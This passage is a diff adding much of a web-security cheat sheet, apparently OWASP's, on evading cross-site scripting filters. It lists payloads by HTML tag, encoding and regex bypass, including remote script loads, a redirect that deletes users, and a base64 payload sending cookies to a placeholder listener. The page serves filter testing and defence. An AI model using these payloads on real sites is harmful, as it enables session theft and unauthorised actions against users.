+<li><code>onPause()</code> (the onpause event fires on every element that is active when the timeline pauses, including the body element)</li>
+<li><code>onPopState()</code> (fires when user navigated the session history)</li>
+<li><code>onProgress()</code> (attacker would use this as a flash movie was loading)</li>
+<li><code>onPropertyChange()</code> (user or attacker would need to change an element property)</li>
+<li><code>onReadyStateChange()</code> (user or attacker would need to change an element property)</li>
+<li><code>onRedo()</code> (user went forward in undo transaction history)</li>
+<li><code>onRepeat()</code> (the event fires once for each repetition of the timeline, excluding the first full cycle)</li>
+<li><code>onReset()</code> (user or attacker resets a form)</li>
+<li><code>onResize()</code> (user would resize the window; attacker could auto initialize with something like: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li>
+<li><code>onResizeEnd()</code> (user would resize the window; attacker could auto initialize with something like: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li>
+<li><code>onResizeStart()</code> (user would resize the window; attacker could auto initialize with something like: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li>
+<li><code>onResume()</code> (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)</li>
+<li><code>onReverse()</code> (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)</li>
+<li><code>onRowsEnter()</code> (user or attacker would need to change a row in a data source)</li>
+<li><code>onRowExit()</code> (user or attacker would need to change a row in a data source)</li>
+<li><code>onRowDelete()</code> (user or attacker would need to delete a row in a data source)</li>
+<li><code>onRowInserted()</code> (user or attacker would need to insert a row in a data source)</li>
+<li><code>onScroll()</code> (user would need to scroll, or attacker could use the <code>scrollBy()</code> function)</li>
+<li><code>onSeek()</code> (the onreverse event fires when the timeline is set to play in any direction other than forward)</li>
+<li><code>onSelect()</code> (user needs to select some text - attacker could auto initialize with something like: <code>window.document.execCommand("SelectAll");</code>)</li>
+<li><code>onSelectionChange()</code> (user needs to select some text - attacker could auto initialize with something like: <code>window.document.execCommand("SelectAll");</code>)</li>
+<li><code>onSelectStart()</code> (user needs to select some text - attacker could auto initialize with something like: <code>window.document.execCommand("SelectAll");</code>)</li>
+<li><code>onStart()</code> (fires at the beginning of each marquee loop)</li>
+<li><code>onStop()</code> (user would need to press the stop button or leave the webpage)</li>
+<li><code>onStorage()</code> (storage area changed)</li>
+<li><code>onSyncRestored()</code> (user interrupts the element's ability to play its media as defined by the timeline to fire)</li>
+<li><code>onSubmit()</code> (requires attacker or user submits a form)</li>
+<li><code>onTimeError()</code> (user or attacker sets a time property, such as dur, to an invalid value)</li>
+<li><code>onTrackChange()</code> (user or attacker changes track in a playList)</li>
+<li><code>onUndo()</code> (user went backward in undo transaction history)</li>
+<li><code>onUnload()</code> (as the user clicks any link or presses the back button or attacker forces a click)</li>
+<li><code>onURLFlip()</code> (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)</li>
+<li><code>seekSegmentTime()</code> (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)</li>
+</ol>
+<h3 id="bgsound">BGSOUND<a class="headerlink" href="#bgsound" title="Permanent link">&para;</a></h3>
+<p><code>&lt;BGSOUND SRC="javascript:alert('XSS');"&gt;</code></p>
+<h3 id="javascript-includes">&amp; JavaScript includes<a class="headerlink" href="#javascript-includes" title="Permanent link">&para;</a></h3>
+<p><code>&lt;BR SIZE="&amp;{alert('XSS')}"&gt;</code></p>
+<h3 id="style-sheet">STYLE sheet<a class="headerlink" href="#style-sheet" title="Permanent link">&para;</a></h3>
+<p><code>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;</code></p>
+<h3 id="remote-style-sheet">Remote style sheet<a class="headerlink" href="#remote-style-sheet" title="Permanent link">&para;</a></h3>
+<p>Using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE and Netscape 8.1+ in IE rendering engine mode. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page:</p>
+<p><code>&lt;LINK REL="stylesheet" HREF="http://xss.rocks/xss.css"&gt;</code></p>
+<h3 id="remote-style-sheet-part-2">Remote style sheet part 2<a class="headerlink" href="#remote-style-sheet-part-2" title="Permanent link">&para;</a></h3>
+<p>This works the same as above, but uses a <code>&lt;STYLE&gt;</code> tag instead of a <code>&lt;LINK&gt;</code> tag). A slight variation on this vector was used
+to hack Google Desktop. As a side note, you can remove the end <code>&lt;/STYLE&gt;</code> tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:</p>
+<p><code>&lt;STYLE&gt;@import'http://xss.rocks/xss.css';&lt;/STYLE&gt;</code></p>
+<h3 id="remote-style-sheet-part-3">Remote style sheet part 3<a class="headerlink" href="#remote-style-sheet-part-3" title="Permanent link">&para;</a></h3>
+<p>This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no different than in the HTTP header saying <code>Link: &lt;http://xss.rocks/xss.css&gt;; REL=stylesheet</code>) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox:</p>
+<p><code>&lt;META HTTP-EQUIV="Link" Content="&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet"&gt;</code></p>
+<h3 id="remote-style-sheet-part-4">Remote style sheet part 4<a class="headerlink" href="#remote-style-sheet-part-4" title="Permanent link">&para;</a></h3>
+<p>This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefor is vulnerable to this for the vast majority of sites:</p>
+<p><code>&lt;STYLE&gt;BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}&lt;/STYLE&gt;</code></p>
+<h3 id="style-tags-with-broken-up-javascript-for-xss">STYLE Tags with Broken-up JavaScript for XSS<a class="headerlink" href="#style-tags-with-broken-up-javascript-for-xss" title="Permanent link">&para;</a></h3>
+<p>This XSS at times sends IE into an infinite loop of alerts:</p>
+<p><code>&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;</code></p>
+<h3 id="style-attribute-using-a-comment-to-break-up-expression">STYLE Attribute using a Comment to Break-up Expression<a class="headerlink" href="#style-attribute-using-a-comment-to-break-up-expression" title="Permanent link">&para;</a></h3>
+<p>Created by Roman Ivanov</p>
+<p><code>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"&gt;</code></p>
+<h3 id="img-style-with-expression">IMG STYLE with Expression<a class="headerlink" href="#img-style-with-expression" title="Permanent link">&para;</a></h3>
+<p>This is really a hybrid of the above XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like above this can send IE into a loop:</p>
+<div class="highlight"><pre><span></span><code>exp/*&lt;A STYLE=&#39;no\xss:noxss(&quot;*//*&quot;);
+xss:ex/*XSS*//*/*/pression(alert(&quot;XSS&quot;))&#39;&gt;
+</code></pre></div>
+<h3 id="style-tag-older-versions-of-netscape-only">STYLE Tag (Older versions of Netscape only)<a class="headerlink" href="#style-tag-older-versions-of-netscape-only" title="Permanent link">&para;</a></h3>
+<p><code>&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt;</code></p>
+<h3 id="style-tag-using-background-image">STYLE Tag using Background-image<a class="headerlink" href="#style-tag-using-background-image" title="Permanent link">&para;</a></h3>
+<p><code>&lt;STYLE&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</code></p>
+<h3 id="style-tag-using-background">STYLE Tag using Background<a class="headerlink" href="#style-tag-using-background" title="Permanent link">&para;</a></h3>
+<p><code>&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;</code>
+<code>&lt;STYLE type="text/css"&gt;BODY{background:url("&lt;javascript:alert&gt;('XSS')")}&lt;/STYLE&gt;</code></p>
+<h3 id="anonymous-html-with-style-attribute">Anonymous HTML with STYLE Attribute<a class="headerlink" href="#anonymous-html-with-style-attribute" title="Permanent link">&para;</a></h3>
+<p>IE6.0 and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:</p>
+<p><code>&lt;XSS STYLE="xss:expression(alert('XSS'))"&gt;</code></p>
+<h3 id="local-htc-file">Local htc File<a class="headerlink" href="#local-htc-file" title="Permanent link">&para;</a></h3>
+<p>This is a little different than the above two cross site scripting vectors because it uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute:</p>
+<p><code>&lt;XSS STYLE="behavior: url(xss.htc);"&gt;</code></p>
+<h3 id="us-ascii-encoding">US-ASCII Encoding<a class="headerlink" href="#us-ascii-encoding" title="Permanent link">&para;</a></h3>
+<p>US-ASCII encoding (found by Kurt Huwig).This uses malformed ASCII encoding with 7 bits instead of 8. This XSS may bypass many content filters but only works if the host transmits in US-ASCII encoding, or if you set the encoding yourself. This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion. Apache Tomcat is the only known server that transmits in US-ASCII encoding.</p>
+<p><code>¼script¾alert(¢XSS¢)¼/script¾</code></p>
+<h3 id="meta">META<a class="headerlink" href="#meta" title="Permanent link">&para;</a></h3>
+<p>The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:</p>
+<p><code>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt;</code></p>
+<h4 id="meta-using-data">META using Data<a class="headerlink" href="#meta-using-data" title="Permanent link">&para;</a></h4>
+<p>Directive URL scheme. This is nice because it also doesn't have anything visibly that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see RFC 2397 for more details or go here or here to encode your own. You can also use the XSS <a href="http://ha.ckers.org/xsscalc.html">calculator</a> below if you just want to encode raw HTML or JavaScript as it has a Base64 encoding method:</p>
+<p><code>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;</code></p>
+<h4 id="meta-with-additional-url-parameter">META with Additional URL Parameter<a class="headerlink" href="#meta-with-additional-url-parameter" title="Permanent link">&para;</a></h4>
+<p>If the target website attempts to see if the URL contains <code>&lt;http://&gt;;</code> at the beginning you can evade it with the following technique (Submitted by Moritz Naumann):</p>
+<p><code>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"&gt;</code></p>
+<h3 id="iframe">IFRAME<a class="headerlink" href="#iframe" title="Permanent link">&para;</a></h3>
+<p>If iframes are allowed there are a lot of other XSS problems as well:</p>
+<p><code>&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;</code></p>
+<h3 id="iframe-event-based">IFRAME Event Based<a class="headerlink" href="#iframe-event-based" title="Permanent link">&para;</a></h3>
+<p>IFrames and most other elements can use event based mayhem like the following... (Submitted by: David Cross)</p>
+<p><code>&lt;IFRAME SRC=# onmouseover="alert(document.cookie)"&gt;&lt;/IFRAME&gt;</code></p>
+<h3 id="frame">FRAME<a class="headerlink" href="#frame" title="Permanent link">&para;</a></h3>
+<p>Frames have the same sorts of XSS problems as iframes</p>
+<p><code>&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;</code></p>
+<h3 id="table">TABLE<a class="headerlink" href="#table" title="Permanent link">&para;</a></h3>
+<p><code>&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;</code></p>
+<h4 id="td">TD<a class="headerlink" href="#td" title="Permanent link">&para;</a></h4>
+<p>Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:</p>
+<p><code>&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:alert('XSS')"&gt;</code></p>
+<h3 id="div">DIV<a class="headerlink" href="#div" title="Permanent link">&para;</a></h3>
+<h4 id="div-background-image">DIV Background-image<a class="headerlink" href="#div-background-image" title="Permanent link">&para;</a></h4>
+<p><code>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;</code></p>
+<h4 id="div-background-image-with-unicoded-xss-exploit">DIV Background-image with Unicoded XSS Exploit<a class="headerlink" href="#div-background-image-with-unicoded-xss-exploit" title="Permanent link">&para;</a></h4>
+<p>This has been modified slightly to obfuscate the URL parameter. The original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail:</p>
+<p><code>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"&gt;</code></p>
+<h4 id="div-background-image-plus-extra-characters">DIV Background-image Plus Extra Characters<a class="headerlink" href="#div-background-image-plus-extra-characters" title="Permanent link">&para;</a></h4>
+<p>Rnaske built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):</p>
+<p><code>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;</code></p>
+<h4 id="div-expression">DIV Expression<a class="headerlink" href="#div-expression" title="Permanent link">&para;</a></h4>
+<p>A variant of this was effective against a real world cross site scripting filter using a newline between the colon and "expression":</p>
+<p><code>&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;</code></p>
+<h3 id="downlevel-hidden-block">Downlevel-Hidden Block<a class="headerlink" href="#downlevel-hidden-block" title="Permanent link">&para;</a></h3>
+<p>Only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode). Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our Cross Site Scripting vector. Or the system could add comment tags around something to attempt to render it harmless. As we can see, that probably wouldn't do the job:</p>
+<div class="highlight"><pre><span></span><code>&lt;!--[if gte IE 4]&gt;
+&lt;SCRIPT&gt;alert(&#39;XSS&#39;);&lt;/SCRIPT&gt;
+&lt;![endif]--&gt;
+</code></pre></div>
+<h3 id="base-tag">BASE Tag<a class="headerlink" href="#base-tag" title="Permanent link">&para;</a></h3>
+<p>Works in IE and Netscape 8.1 in safe mode. You need the <code>//</code> to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that the website uses dynamically placed images like <code>images/image.jpg</code> rather than full paths. If the path includes a leading forward slash like <code>/images/image.jpg</code> you can remove one slash from this vector (as long as there are two to begin the comment this will work):</p>
+<p><code>&lt;BASE HREF="javascript:alert('XSS');//"&gt;</code></p>
+<h3 id="object-tag">OBJECT Tag<a class="headerlink" href="#object-tag" title="Permanent link">&para;</a></h3>
+<p>If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag). The linked file is actually an HTML file that can contain your XSS:</p>
+<p><code>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"&gt;&lt;/OBJECT&gt;</code></p>
+<h3 id="embed-a-flash-movie-that-contains-xss">EMBED a Flash Movie That Contains XSS<a class="headerlink" href="#embed-a-flash-movie-that-contains-xss" title="Permanent link">&para;</a></h3>
+<!-- markdownlint-disable MD034-->
+<p>Click here for a demo: ~~http://ha.ckers.org/xss.swf~~</p>
+<!-- markdownlint-enable MD034-->
+
+<p><code>&lt;EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;</code></p>
+<p>If you add the attributes <code>allowScriptAccess="never"</code> and <code>allownetworking="internal"</code> it can mitigate
+this risk (thank you to Jonathan Vanasco for the info).</p>
+<h3 id="embed-svg-which-contains-xss-vector">EMBED SVG Which Contains XSS Vector<a class="headerlink" href="#embed-svg-which-contains-xss-vector" title="Permanent link">&para;</a></h3>
+<p>This example only works in Firefox, but it's better than the above vector in Firefox because it does not require the user to have Flash turned on or installed. Thanks to nEUrOO for this one.</p>
+<p><code>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;</code></p>
+<h3 id="using-actionscript-inside-flash-for-obfuscation">Using ActionScript Inside Flash for Obfuscation<a class="headerlink" href="#using-actionscript-inside-flash-for-obfuscation" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>a=&quot;get&quot;;
+b=&quot;URL(\&quot;&quot;;
+c=&quot;javascript:&quot;;
+d=&quot;alert(&#39;XSS&#39;);\&quot;)&quot;; 
+eval(a+b+c+d);
+</code></pre></div>
+<h3 id="xml-data-island-with-cdata-obfuscation">XML Data Island with CDATA Obfuscation<a class="headerlink" href="#xml-data-island-with-cdata-obfuscation" title="Permanent link">&para;</a></h3>
+<p>This XSS attack works only in IE and Netscape 8.1 in IE rendering engine mode) - vector found by Sec Consult while auditing Yahoo:</p>
+<div class="highlight"><pre><span></span><code>&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&#39;XSS&#39;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt; 
+&lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;
+</code></pre></div>
+<h3 id="locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island">Locally hosted XML with embedded JavaScript that is generated using an XML data island<a class="headerlink" href="#locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island" title="Permanent link">&para;</a></h3>
+<p>This is the same as above but instead referrs to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector. You can see the result here:</p>
+<div class="highlight"><pre><span></span><code>&lt;XML SRC=&quot;xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;  
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+</code></pre></div>
+<h3 id="htmltime-in-xml">HTML+TIME in XML<a class="headerlink" href="#htmltime-in-xml" title="Permanent link">&para;</a></h3>
+<p>This is how Grey Magic hacked Hotmail and Yahoo!. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work:</p>
+<div class="highlight"><pre><span></span><code>&lt;HTML&gt;&lt;BODY&gt;
+&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;
+&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;
+&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+</code></pre></div>
+<h3 id="assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js">Assuming you can only fit in a few characters and it filters against <code>.js</code><a class="headerlink" href="#assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js" title="Permanent link">&para;</a></h3>
+<p>You can rename your JavaScript file to an image as an XSS vector:</p>
+<p><code>&lt;SCRIPT SRC="http://xss.rocks/xss.jpg"&gt;&lt;/SCRIPT&gt;</code></p>
+<h3 id="ssi-server-side-includes">SSI (Server Side Includes)<a class="headerlink" href="#ssi-server-side-includes" title="Permanent link">&para;</a></h3>
+<p>This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues:</p>
+<p><code>&lt;!--#exec cmd="/bin/echo '&lt;SCR'"--&gt;&lt;!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;'"--&gt;</code></p>
+<h3 id="php">PHP<a class="headerlink" href="#php" title="Permanent link">&para;</a></h3>
+<p>Requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts remotely like this, there are probably much more dire issues:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?</span> <span class="k">echo</span><span class="p">(</span><span class="s1">&#39;&lt;SCR)&#39;</span><span class="p">;</span>
+<span class="k">echo</span><span class="p">(</span><span class="s1">&#39;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<h3 id="img-embedded-commands">IMG Embedded Commands<a class="headerlink" href="#img-embedded-commands" title="Permanent link">&para;</a></h3>
+<p>This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc.... This is one of the lesser used but more useful XSS vectors:</p>
+<p><code>&lt;IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"&gt;</code></p>
+<h4 id="img-embedded-commands-part-ii">IMG Embedded Commands part II<a class="headerlink" href="#img-embedded-commands-part-ii" title="Permanent link">&para;</a></h4>
+<p>This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <code>&lt;IMG SRC="httx://badguy.com/a.jpg"&gt;</code> could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this):</p>
+<p><code>Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser</code></p>
+<h3 id="cookie-manipulation">Cookie Manipulation<a class="headerlink" href="#cookie-manipulation" title="Permanent link">&para;</a></h3>
+<p>Admittedly this is pretty obscure but I have seen a few examples where <code>&lt;META</code> is allowed and you can use it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc...):</p>
+<p><code>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"&gt;</code></p>
+<h3 id="utf-7-encoding">UTF-7 Encoding<a class="headerlink" href="#utf-7-encoding" title="Permanent link">&para;</a></h3>
+<p>If the page that the XSS resides on doesn't provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov for this one). Click here for an example (you don't need the charset statement if the user's browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 in IE rendering engine mode). This does not work in any modern browser without changing the encoding type which is why it is marked as completely unsupported. Watchfire found this hole in Google's custom 404 script.:</p>
+<p><code>&lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</code></p>
+<h3 id="xss-using-html-quote-encapsulation">XSS Using HTML Quote Encapsulation<a class="headerlink" href="#xss-using-html-quote-encapsulation" title="Permanent link">&para;</a></h3>
+<p>This was tested in IE, your mileage may vary. For performing XSS on sites that allow <code>&lt;SCRIPT&gt;</code> but don't allow <code>&lt;SCRIPT SRC...</code> by way of a regex filter <code>/\&lt;script\[^\&gt;\]+src/i</code>:</p>
+<p><code>&lt;SCRIPT a="&gt;" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></p>
+<p>For performing XSS on sites that allow <code>&lt;SCRIPT&gt;</code> but don't allow <code>\&lt;script src...</code> by way of a regex filter <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code> (this is an important one, because I've seen this regex in the wild):</p>
+<p><code>&lt;SCRIPT ="&gt;" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></p>
+<p>Another XSS to evade the same filter, <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code>:</p>
+<p><code>&lt;SCRIPT a="&gt;" '' SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></p>
+<p>Yet another XSS to evade the same filter, <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code>. I know I said I wasn't goint to discuss mitigation techniques but the only thing I've seen work for this XSS example if you still want to allow <code>&lt;SCRIPT&gt;</code> tags but not remote script is a state machine (and of course there are other ways to get around this if they allow <code>&lt;SCRIPT&gt;</code> tags):</p>
+<p><code>&lt;SCRIPT "a='&gt;'" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></p>
+<p>And one last XSS attack to evade, <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code> using grave accents (again, doesn't work in Firefox):</p>
+<!-- markdownlint-disable MD038-->
+<p><code>&lt;SCRIPT a=</code>&gt;<code>SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></p>
+<!-- markdownlint-enable MD038-->
+
+<p>Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly:</p>
+<p><code>&lt;SCRIPT a="&gt;'&gt;" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></p>
+<p>This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:</p>
+<p><code>&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></p>
+<h3 id="url-string-evasion">URL String Evasion<a class="headerlink" href="#url-string-evasion" title="Permanent link">&para;</a></h3>
+<p>Assuming <code>http://www.google.com/</code> is programmatically disallowed:</p>
+<h4 id="ip-versus-hostname">IP Versus Hostname<a class="headerlink" href="#ip-versus-hostname" title="Permanent link">&para;</a></h4>
+<p><code>&lt;A HREF="http://66.102.7.147/"&gt;XSS&lt;/A&gt;</code></p>
+<h4 id="url-encoding">URL Encoding<a class="headerlink" href="#url-encoding" title="Permanent link">&para;</a></h4>
+<p><code>&lt;A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"&gt;XSS&lt;/A&gt;</code></p>
+<h4 id="dword-encoding">DWORD Encoding<a class="headerlink" href="#dword-encoding" title="Permanent link">&para;</a></h4>
+<p>Note: there are other of variations of Dword encoding - see the IP Obfuscation calculator below for more details:</p>
+<p><code>&lt;A HREF="http://1113982867/"&gt;XSS&lt;/A&gt;</code></p>
+<h4 id="hex-encoding">Hex Encoding<a class="headerlink" href="#hex-encoding" title="Permanent link">&para;</a></h4>
+<p>The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quotet is not required):</p>
+<p><code>&lt;A HREF="http://0x42.0x0000066.0x7.0x93/"&gt;XSS&lt;/A&gt;</code></p>
+<h4 id="octal-encoding">Octal Encoding<a class="headerlink" href="#octal-encoding" title="Permanent link">&para;</a></h4>
+<p>Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc...:</p>
+<p><code>&lt;A HREF="http://0102.0146.0007.00000223/"&gt;XSS&lt;/A&gt;</code></p>
+<h4 id="base64-encoding">Base64 Encoding<a class="headerlink" href="#base64-encoding" title="Permanent link">&para;</a></h4>
+<p><code>&lt;img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))"&gt;</code></p>
+<h4 id="mixed-encoding">Mixed Encoding<a class="headerlink" href="#mixed-encoding" title="Permanent link">&para;</a></h4>
+<p>Let's mix and match base encoding and throw in some tabs and newlines - why browsers allow this, I'll never know). The tabs and newlines only work if this is encapsulated with quotes:</p>
+<!-- markdownlint-disable MD010-->
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span> <span class="na">HREF</span><span class="o">=</span><span class="s">&quot;h </span>
+<span class="s">tt  p://6   6.000146.0x7.147/&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
+</code></pre></div>
+<!-- markdownlint-enable MD010-->
+
+<h4 id="protocol-resolution-bypass">Protocol Resolution Bypass<a class="headerlink" href="#protocol-resolution-bypass" title="Permanent link">&para;</a></h4>
